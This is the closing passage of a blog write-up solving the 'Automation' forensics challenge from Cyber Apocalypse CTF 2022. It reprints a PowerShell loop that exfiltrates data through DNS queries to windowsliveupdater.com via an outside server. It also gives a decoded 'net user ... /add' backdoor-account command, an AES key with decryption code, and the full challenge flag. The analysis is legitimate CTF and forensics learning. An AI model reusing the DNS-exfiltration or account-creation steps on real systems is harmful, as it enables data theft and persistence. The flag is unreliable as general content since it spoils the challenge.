punctuation\">;</span> <span class=\"token variable\">$ans</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$domain</span> = <span class=\"token operator\">-join</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pr</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$ans</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string\">\".windowsliveupdater.com\"</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token function\">Resolve-DnsName</span> <span class=\"token operator\">-</span><span class=\"token function\">type</span> A <span class=\"token operator\">-</span>DnsOnly <span class=\"token variable\">$domain</span> <span class=\"token operator\">-</span>Server 147<span class=\"token punctuation\">.</span>182<span class=\"token punctuation\">.</span>172<span class=\"token punctuation\">.</span>189\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>To specify the start and end of each command, first send a request to “start.windowsliveupdater.com” and finally a request to “end.windowsliveupdater.com”</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token function\">Resolve-DnsName</span> <span class=\"token operator\">-</span><span class=\"token function\">type</span> A <span class=\"token operator\">-</span>DnsOnly <span class=\"token function\">start</span><span class=\"token punctuation\">.</span>windowsliveupdater<span class=\"token punctuation\">.</span>com <span class=\"token operator\">-</span>Server 147<span class=\"token punctuation\">.</span>182<span class=\"token punctuation\">.</span>172<span class=\"token punctuation\">.</span>189\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$ans</span> = 0<span class=\"token punctuation\">;</span> <span class=\"token variable\">$ans</span> <span class=\"token operator\">-lt</span> <span class=\"token variable\">$pr</span><span class=\"token punctuation\">.</span>length-1<span class=\"token punctuation\">;</span> <span class=\"token variable\">$ans</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$domain</span> = <span class=\"token operator\">-join</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pr</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$ans</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string\">\".windowsliveupdater.com\"</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token function\">Resolve-DnsName</span> <span class=\"token operator\">-</span><span class=\"token function\">type</span> A <span class=\"token operator\">-</span>DnsOnly <span class=\"token variable\">$domain</span> <span class=\"token operator\">-</span>Server 147<span class=\"token punctuation\">.</span>182<span class=\"token punctuation\">.</span>172<span class=\"token punctuation\">.</span>189\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">Resolve-DnsName</span> <span class=\"token operator\">-</span><span class=\"token function\">type</span> A <span class=\"token operator\">-</span>DnsOnly <span class=\"token keyword\">end</span><span class=\"token punctuation\">.</span>windowsliveupdater<span class=\"token punctuation\">.</span>com <span class=\"token operator\">-</span>Server 147<span class=\"token punctuation\">.</span>182<span class=\"token punctuation\">.</span>172<span class=\"token punctuation\">.</span>189\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/CyberApocalypseCTF2022-Forensics/automation-4.png\" alt=\"Puppeteer\"></p>\n<p>After collecting all the parts of each command, the final script is as follows</p>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token keyword\">function</span> Create-AesManagedObject<span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$IV</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$aesManaged</span> = <span class=\"token function\">New-Object</span> <span class=\"token string\">\"System.Security.Cryptography.AesManaged\"</span>\n    <span class=\"token variable\">$aesManaged</span><span class=\"token punctuation\">.</span>Mode = <span class=\"token namespace\">[System.Security.Cryptography.CipherMode]</span>::CBC\n    <span class=\"token variable\">$aesManaged</span><span class=\"token punctuation\">.</span>Padding = <span class=\"token namespace\">[System.Security.Cryptography.PaddingMode]</span>::Zeros\n    <span class=\"token variable\">$aesManaged</span><span class=\"token punctuation\">.</span>BlockSize = 128\n    <span class=\"token variable\">$aesManaged</span><span class=\"token punctuation\">.</span>KeySize = 256\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$IV</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$IV</span><span class=\"token punctuation\">.</span>getType<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>Name <span class=\"token operator\">-eq</span> <span class=\"token string\">\"String\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$aesManaged</span><span class=\"token punctuation\">.</span>IV = <span class=\"token namespace\">[System.Convert]</span>::FromBase64String<span class=\"token punctuation\">(</span><span class=\"token variable\">$IV</span><span class=\"token punctuation\">)</span>\n     \n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$aesManaged</span><span class=\"token punctuation\">.</span>IV = <span class=\"token variable\">$IV</span>\n     \n\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">.</span>getType<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>Name <span class=\"token operator\">-eq</span> <span class=\"token string\">\"String\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$aesManaged</span><span class=\"token punctuation\">.</span>Key = <span class=\"token namespace\">[System.Convert]</span>::FromBase64String<span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$aesManaged</span><span class=\"token punctuation\">.</span>Key = <span class=\"token variable\">$key</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token variable\">$aesManaged</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> Create-AesKey<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  \n    <span class=\"token variable\">$aesManaged</span> = Create-AesManagedObject <span class=\"token variable\">$key</span> <span class=\"token variable\">$IV</span>\n    <span class=\"token namespace\">[System.Convert]</span>::ToBase64String<span class=\"token punctuation\">(</span><span class=\"token variable\">$aesManaged</span><span class=\"token punctuation\">.</span>Key<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> Encrypt-String<span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$unencryptedString</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$bytes</span> = <span class=\"token namespace\">[System.Text.Encoding]</span>::UTF8<span class=\"token punctuation\">.</span>GetBytes<span class=\"token punctuation\">(</span><span class=\"token variable\">$unencryptedString</span><span class=\"token punctuation\">)</span>\n    <span class=\"token variable\">$aesManaged</span> = Create-AesManagedObject <span class=\"token variable\">$key</span>\n    <span class=\"token variable\">$encryptor</span> = <span class=\"token variable\">$aesManaged</span><span class=\"token punctuation\">.</span>CreateEncryptor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token variable\">$encryptedData</span> = <span class=\"token variable\">$encryptor</span><span class=\"token punctuation\">.</span>TransformFinalBlock<span class=\"token punctuation\">(</span><span class=\"token variable\">$bytes</span><span class=\"token punctuation\">,</span> 0<span class=\"token punctuation\">,</span> <span class=\"token variable\">$bytes</span><span class=\"token punctuation\">.</span>Length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token namespace\">[byte[]]</span> <span class=\"token variable\">$fullData</span> = <span class=\"token variable\">$aesManaged</span><span class=\"token punctuation\">.</span>IV <span class=\"token operator\">+</span> <span class=\"token variable\">$encryptedData</span>\n    <span class=\"token variable\">$aesManaged</span><span class=\"token punctuation\">.</span>Dispose<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token namespace\">[System.BitConverter]</span>::ToString<span class=\"token punctuation\">(</span><span class=\"token variable\">$fullData</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">function</span> Decrypt-String<span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$encryptedStringWithIV</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$bytes</span> = <span class=\"token namespace\">[System.Convert]</span>::FromBase64String<span class=\"token punctuation\">(</span><span class=\"token variable\">$encryptedStringWithIV</span><span class=\"token punctuation\">)</span>\n    <span class=\"token variable\">$IV</span> = <span class=\"token variable\">$bytes</span><span class=\"token punctuation\">[</span>0<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>15<span class=\"token punctuation\">]</span>\n    <span class=\"token variable\">$aesManaged</span> = Create-AesManagedObject <span class=\"token variable\">$key</span> <span class=\"token variable\">$IV</span>\n    <span class=\"token variable\">$decryptor</span> = <span class=\"token variable\">$aesManaged</span><span class=\"token punctuation\">.</span>CreateDecryptor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$unencryptedData</span> = <span class=\"token variable\">$decryptor</span><span class=\"token punctuation\">.</span>TransformFinalBlock<span class=\"token punctuation\">(</span><span class=\"token variable\">$bytes</span><span class=\"token punctuation\">,</span> 16<span class=\"token punctuation\">,</span> <span class=\"token variable\">$bytes</span><span class=\"token punctuation\">.</span>Length <span class=\"token operator\">-</span> 16<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$aesManaged</span><span class=\"token punctuation\">.</span>Dispose<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token namespace\">[System.Text.Encoding]</span>::UTF8<span class=\"token punctuation\">.</span>GetString<span class=\"token punctuation\">(</span><span class=\"token variable\">$unencryptedData</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>Trim<span class=\"token punctuation\">(</span><span class=\"token namespace\">[char]</span>0<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">filter</span> parts<span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token variable\">$t</span> = <span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span> 0<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token namespace\">[math]</span>::floor<span class=\"token punctuation\">(</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">.</span>length <span class=\"token operator\">/</span> <span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">|</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">.</span>substring<span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$_</span><span class=\"token punctuation\">,</span> <span class=\"token namespace\">[math]</span>::min<span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token variable\">$query</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$_</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span> \n<span class=\"token variable\">$key</span> = <span class=\"token string\">\"a1E4MUtycWswTmtrMHdqdg==\"</span>\n\n<span class=\"token function\">write-Output</span> <span class=\"token string\">\"Command :\"</span>\n<span class=\"token comment\">#windowsliveupdater.com</span>\n<span class=\"token variable\">$command</span> = @<span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span> in <span class=\"token variable\">$command</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\tDecrypt-String <span class=\"token variable\">$key</span> <span class=\"token variable\">$cmd</span>\n\t<span class=\"token function\">write-host</span> <span class=\"token string\">\"****\"</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">write-host</span> <span class=\"token string\">\"command Output :\"</span>\n<span class=\"token variable\">$commandOutput</span> = @<span class=\"token punctuation\">(</span>\n\t<span class=\"token string\">\"CC1C9AC2958A2E63609272E2B4F8F43632A806549B03AB7E4EB39771AEDA4A1BC1006AC8A03F9776B08321BD6D5247BB\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"7679895D1CF7C07BB6A348E1AA4AFC655958A6856F1A34AAD5E97EA55B08767035F2497E5836EA0ECA1F1280F59742A3\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"09E28DD82C14BC32513652DAC2F2C27B0D73A3288A980D8FCEF94BDDCF9E28222A1CA17BB2D90FCD615885634879041420FC39C684A9E371CC3A06542B6660055840BD94CCE65E23613925B4D9D2BA5318EA75BC653004D45D505ED62567017A6FA4E7593D83092F67A81082D9930E99BA20E34AACC4774F067442C6622F5DA2A9B09FF558A8DF000ECBD37804CE663E3521599BC7591005AB6799C57068CF0DC6884CECF01C0CD44FD6B82DB788B35D62F02E4CAA1D973FBECC235AE9F40254C63D3C93C89930DA2C4F42D9FC123D8BAB00ACAB5198AFCC8C6ACD81B19CD264CC6353668CEA4C88C8AEEA1D58980022DA8FA2E917F17C28608818BF550FEA66973B5A8355258AB0AA281AD88F5B9EB103AC666FE09A1D449736335C09484D271C301C6D5780AB2C9FA333BE3B0185BF071FB1205C4DBEAA2241168B0748902A6CE14903C7C47E7C87311044CB9873A4\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"ECABC349D27C0B0FFFD1ACEEDBE06BB6C2EB000EE4F9B35D6F001500E85642A2DCC8F1BE2CF4D667F458C1DE46D24B1C2E0F5D94E52649C70402C1B0A2FF7B49FC32DDD67F275307A74B2C4D0864B3F0486186DA9443EB747F717B3911C959DC7E300844D60655410C3988238E615D616F33D27F63CE4D1E065A416911BC50D458749599D2CB08DB561988EB2902E05D9886FDDAC2BED6F6DA73637AD2F20CF199B8CE3D9DEE03C0180C7D1198B49C02769E5EE4EAB896D7D3BB478EA140816779472A243BFB0852AF372323EC1329883C81A3F2AEB1D3DAAE8496E1DBF97F435AE40A09203B890C4A174D77CB7026C4E990A6FB6424A7501823AD31D3D6B6344C7971C8D447C078C4471732AD881C394BC8B1A66E0BED43DDC359269B57D1D5D68DCD2A608BF61716BB47D6FE4D5C9D6E8BB2981F214A8234B0DD0210CA96EB2D6322B0F7F3D748C4C9F8B80EFF5A6921A3D1A8621A49F4D29BC9851D25230B\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"841BDB4E9E5F8BF721B58E8308177B572E9A015967DA5BF11AC9155FC2159C8F610CD82F818B4BDF5E48722DAF4BEEEBABCE30583F503B484BF99020E28A1B8F282A23FEB3A21C3AD89882F5AC0DD3D57D87875231652D0F4431EC37E51A09D57E2854D11003AB6E2F4BFB4F7E2477DAA44FCA3BC6021777F03F139D458C0524\"</span><span class=\"token punctuation\">,</span>\n\t<span class=\"token string\">\"AE4ABE8A3A88D21DEEA071A72D65A35EF158D9F025897D1843E37B7463EC7833\"</span>\n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span> in <span class=\"token variable\">$commandOutput</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$Bytes</span> = <span class=\"token namespace\">[byte[]]</span>::new<span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">.</span>Length <span class=\"token operator\">/</span> 2<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token keyword\">For</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span>=0<span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-lt</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">.</span>Length<span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">+=</span>2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token variable\">$Bytes</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token operator\">/</span>2<span class=\"token punctuation\">]</span> = <span class=\"token namespace\">[convert]</span>::ToByte<span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">.</span>Substring<span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">,</span> 2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> 16<span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n    <span class=\"token variable\">$backToPlainText</span> = Decrypt-String <span class=\"token variable\">$key</span> $<span class=\"token punctuation\">(</span><span class=\"token namespace\">[Convert]</span>::ToBase64String<span class=\"token punctuation\">(</span><span class=\"token variable\">$Bytes</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token variable\">$backToPlainText</span> \n\t\t<span class=\"token function\">write-host</span> <span class=\"token string\">\"****\"</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\"># net user DefaultUsr \"JHBhcnQxPSdIVEJ7eTB1X2M0bl8n\" /add > $part1='HTB&#123;y0u_c4n_'</span>\n<span class=\"token comment\"># displayName=Pan Antivirus 4.0, $part2=4utom4t3_but_y0u_c4nt_h1de&#125;</span>\n\n<span class=\"token comment\">#HTB&#123;y0u_c4n_4utom4t3_but_y0u_c4nt_h1de&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h2><table>\n<thead>\n<tr>\n<th>name</th>\n<th>gist</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Puppeteer</td>\n<td><a href=\"https://gist.github.com/HSNHK/c0d8fd30ef70e646257eafa9fb2bb440\">CyberApocalypseCTF2022 Puppeteer.ps1</a></td>\n</tr>\n<tr>\n<td>Golden Persistence</td>\n<td><a href=\"https://gist.github.com/HSNHK/34583b2d19b04454bdf7dae6228fc6c2\">CyberApocalypseCTF2022 GoldenPersistence.ps1</a></td>\n</tr>\n<tr>\n<td>Automation</td>\n<td><a href=\"https://gist.github.com/HSNHK/de816c90f5762d8be5a0c4eebf94e41a\">CyberApocalypseCTF2022 Automation.ps1</a></td>\n</tr>\n</tbody></table>\n","feature":true,"text":"Challenges solved in the field of forensics in the Cyber Apocalypse CTF 2022 competition. Puppeteer Golden Persistence Automation PuppeteerT...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"CTF","slug":"CTF","count":3,"path":"api/categories/CTF.json"},{"name":"Security","slug":"CTF/Security","count":3,"path":"api/categories/CTF/Security.json"}],"tags":[{"name":"Voynich","slug":"Voynich","count":3,"path":"api/tags/Voynich.json"},{"name":"CTF-Team","slug":"CTF-Team","count":3,"path":"api/tags/CTF-Team.json"},{"name":"CTF","slug":"CTF","count":2,"path":"api/tags/CTF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Puppeteer\"><span class=\"toc-text\">Puppeteer</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Golden-Persistence\"><span class=\"toc-text\">Golden Persistence</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Automation\"><span class=\"toc-text\">Automation</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#POC\"><span class=\"toc-text\">POC</span></a></li></ol>","author":{"name":"HSNHK","slug":"blog-author","avatar":"https://github.com/HSNHK.png?size=250","link":"/","description":"Computer student | interested in programming and security (OSCP && OSWE) | CTF Player | Red Team 🌱","socials":{"github":"https://github.com/HSNHK","twitter":"https://twitter.com/0xHSNHK","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"medium":{"icon":"https://img.icons8.com/color/344/medium-logo.png","link":"https://hsnhk.medium.com/"}}}},"mapped":true,"prev_post":{},"next_post":{"title":"Windows Red Team Cheat Sheet","uid":"4da614f2089b6628415f50fed745da80","slug":"WinRedTeamCheatSheet","date":"2022-04-20T08:21:13.000Z","updated":"2022-04-20T09:40:01.985Z","comments":true,"path":"api/articles/WinRedTeamCheatSheet.json","keywords":"security, ctf, redteam, programming, hacking, python, golang, linux, windows, hackthebox, ctftime","cover":"/post/WinRedTeamCheatSheet/cover.jpg","text":"List of tools and techniques required by the red team. TIP The contents of this post have been collected from various books and repositories...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"RedTeam","slug":"RedTeam","count":1,"path":"api/categories/RedTeam.json"},{"name":"Security","slug":"RedTeam/Security","count":1,"path":"api/categories/RedTeam/Security.json"}],"tags":[{"name":"Security","slug":"Security","count":1,"path":"api/tags/Security.json"},{"name":"RedTeam","slug":"RedTeam","count":1,"path":"api/tags/RedTeam.json"}],"author":{"name":"HSNHK","slug":"blog-author","avatar":"https://github.com/HSNHK.png?size=250","link":"/","description":"Computer student | interested in programming and security (OSCP && OSWE) | CTF Player | Red Team 🌱","socials":{"github":"https://github.com/HSNHK","twitter":"https://twitter.com/0xHSNHK","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"medium":{"icon":"https://img.icons8.com/color/344/medium-logo.png","link":"https://hsnhk.medium.com/"}}}},"feature":true}}